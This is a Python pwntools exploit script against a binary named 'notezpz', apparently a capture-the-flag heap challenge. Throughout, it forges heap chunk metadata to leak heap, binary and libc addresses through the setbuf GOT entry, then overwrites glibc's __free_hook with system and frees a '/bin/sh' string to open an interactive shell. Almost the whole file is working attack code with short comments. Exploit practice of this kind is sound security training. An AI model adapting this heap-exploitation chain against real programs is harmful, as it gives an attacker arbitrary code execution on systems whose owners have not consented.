#!/usr/bin/env python2

from pwn import*

def create_question(p):
    p.recvuntil(': ', drop=True)
    p.sendline('C')

def delete_question(p, question_id):
    p.recvuntil(': ', drop=True)
    p.sendline('D')
    p.recvuntil(': ', drop=True)
    p.sendline(question_id)

def set_question(p, question_id, question):
    p.recvuntil(': ', drop=True)
    p.sendline('S')
    p.recvuntil(': ', drop=True)
    p.sendline(question_id)
    p.recvuntil(': ', drop=True)
    p.sendline(question)

def ask_question(p, question_id):
    p.recvuntil(': ', drop=True)
    p.sendline('A')
    p.recvuntil(': ', drop=True)
    p.sendline(question_id)
    p.recvuntil(': \'', drop=True)

p = process('./notezpz')
e = p.elf

libc = ELF('/usr/lib/libc-2.30.so')


create_question(p)
create_question(p)
create_question(p)
delete_question(p, '1')
delete_question(p, '0')

# create q3.
# q3 uses addr of q0 since it's at
# the start of the free list.
# str in q0 contains foward ptr to q1
create_question(p) 

q1_addr = u32(p.recvline(ask_question(p, '3'))[0:4])
q0_addr = q1_addr - 0x40
q2_addr = q1_addr + 0x40


# leak addr of print_question
# by making fwd pointer in free'd q1 struct chunk point to q0 struct chunk
forge_chunk = fit({
    0x1c: '\x21\x00\x00\x00',
    0x20: p32(q0_addr),
}, filler = '\x00')

set_question(p, '0', forge_chunk)
# question 4 string chunk now points to q0 struct chunk
create_question(p)

print_question_addr = u32(p.recvline(ask_question(p, '4'))[0:4])

# leak libc address
e.address = print_question_addr - e.symbols['print_question']

leak_setbuf_payload = fit({
    0x1c: '\x21\x00\x00\x00',
    0x20: p32(print_question_addr),
    0x38: p32(e.got['setbuf'])
}, filler = '\x00')

# change q1 str address in the q1 struct
# to be setbuf entry in the got by overflowing q0 string chunk
set_question(p, '0', leak_setbuf_payload)
setbuf_addr = u32(p.recvline(ask_question(p, '1'))[0:4])
libc.address = setbuf_addr - libc.symbols['setbuf']

write_freehook_addr = fit({
    0x1c: '\x21\x00\x00\x00',
    0x20: p32(print_question_addr),
    0x38: p32(libc.symbols['__free_hook'])
}, filler = '\x00')

set_question(p, '0', write_freehook_addr)

#overwrite glibc's free hook with pointer to system function
set_question(p, '1', p32(libc.symbols['system']))
set_question(p, '2', '/bin/sh')
delete_question(p, '2')

p.interactive() 
